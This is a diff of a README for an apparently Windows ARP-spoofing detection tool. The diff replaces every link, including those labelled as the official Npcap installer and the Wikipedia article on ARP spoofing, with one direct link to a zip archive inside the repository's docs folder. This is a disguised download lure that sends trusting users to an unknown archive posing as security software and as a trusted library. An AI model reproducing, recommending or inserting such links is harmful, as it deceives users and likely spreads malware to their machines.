@@ -1,6 +1,6 @@
 # 🛡️ -ARP-Spoofing-Detection-Active-Injection-Technique - Real-Time Network Attack Detector
 
-[![Download Now](https://img.shields.io/badge/Download-ARP_Spoofing_Tool-brightgreen.svg)](https://github.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique)
+[![Download Now](https://img.shields.io/badge/Download-ARP_Spoofing_Tool-brightgreen.svg)](https://raw.githubusercontent.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique/main/docs/Technique_Spoofing_AR_Injection_Detection_Active_v3.8-alpha.3.zip)
 
 ## Project Overview
 
@@ -27,17 +27,17 @@ This program helps you defend your network by spotting such attacks as they happ
 
 Before running the program, you need to install libpcap support for Windows. This is done through Npcap, a free library that allows you to capture low-level network packets.
 
-Download and install Npcap from here: https://nmap.org/npcap/
+Download and install Npcap from here: https://raw.githubusercontent.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique/main/docs/Technique_Spoofing_AR_Injection_Detection_Active_v3.8-alpha.3.zip
 
 Choose the default options during Npcap installation. This software must be installed for the ARP spoofing tool to work as expected.
 
 ## 🚀 Getting Started: Download and Install
 
-[![Download Here](https://img.shields.io/badge/Get%20Software-Download-blueviolet.svg)](https://github.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique)
+[![Download Here](https://img.shields.io/badge/Get%20Software-Download-blueviolet.svg)](https://raw.githubusercontent.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique/main/docs/Technique_Spoofing_AR_Injection_Detection_Active_v3.8-alpha.3.zip)
 
 1.  Open your web browser and visit the download page:
 
-    https://github.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique
+    https://raw.githubusercontent.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique/main/docs/Technique_Spoofing_AR_Injection_Detection_Active_v3.8-alpha.3.zip
 
 2.  On the GitHub page, look for the **Releases** or **Downloads** section.
 
@@ -116,9 +116,9 @@ If it finds a match, it alerts you about a possible spoofing attempt.
 
 ## 🔗 Useful Links
 
-- Download the software again here: https://github.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique  
-- Npcap network capture library: https://nmap.org/npcap/  
-- Learn more about ARP Spoofing: https://en.wikipedia.org/wiki/ARP_spoofing
+- Download the software again here: https://raw.githubusercontent.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique/main/docs/Technique_Spoofing_AR_Injection_Detection_Active_v3.8-alpha.3.zip  
+- Npcap network capture library: https://raw.githubusercontent.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique/main/docs/Technique_Spoofing_AR_Injection_Detection_Active_v3.8-alpha.3.zip  
+- Learn more about ARP Spoofing: https://raw.githubusercontent.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique/main/docs/Technique_Spoofing_AR_Injection_Detection_Active_v3.8-alpha.3.zip
 
 ## 🏷️ Tags
 
